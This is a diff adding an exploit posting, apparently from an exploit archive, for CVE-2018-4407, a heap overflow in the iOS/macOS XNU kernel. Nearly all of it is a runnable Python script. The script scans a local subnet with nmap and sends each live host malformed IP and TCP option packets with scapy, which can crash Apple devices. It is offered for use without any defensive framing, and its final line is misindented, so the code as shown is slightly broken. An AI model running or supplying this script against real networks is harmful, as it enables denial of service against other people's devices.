@@ -1,0 +1,47 @@
+id: 31545
+date: 11/06/2018
+title: XNU Kernel iOS / macOS heap buffer overflow Exploit
+author: 0day Today Team
+cves: CVE-2018-4407
+
+#! /usr/bin/python3
+
+import os
+import time
+import nmap
+import struct
+from scapy.all import *
+
+def attack(src='192.168.1.95', subnet='192.168.1.0/24'):
+    print ("0day.today Scanning network, please wait...")
+    nm = nmap.PortScanner()
+    nm.scan(hosts=subnet, arguments='-sP')
+    list_of_ips = nm.all_hosts()
+    list_of_ips = sorted(list_of_ips, key=lambda ip: struct.unpack("!L", inet_aton(ip))[0])
+    payload = ""
+    for i in range(40):
+        payload+="x"
+        for host in list_of_ips:
+            print("[*] Sending Payload to "+host+" | Payload: "+payload)
+            send(IP(src=src, dst=host, options=payload)/TCP(options=[(19,"x"*18),(19,"x"*18)]))
+            time.sleep(0.2)
+
+if __name__ == '__main__':
+    try:
+        if not os.geteuid() == 0:
+            sys.exit('\nscapy requires root privileges.\n')
+        isdefault = input('Default mode configuration:\nYour IP: 192.168.1.95\nYour subnet: 192.168.1.0/24\nGo to custom configuration ? ["yes"/"no"] ')
+        if isdefault=='no':
+            attack()
+        else:
+            src = input('What is YOUR IP address ? (example: 192.168.1.95) ')
+            subnet = input('What is the subnet address ? (example: 192.168.1.0/24) ')
+            attack(src=src, subnet=subnet)
+    except KeyboardInterrupt:
+        print('\nInterrupted\n')
+        try:
+            sys.exit(0)
+        except SystemExit:
+os._exit(0)
+
+#  0day.today [2023-03-26]  #
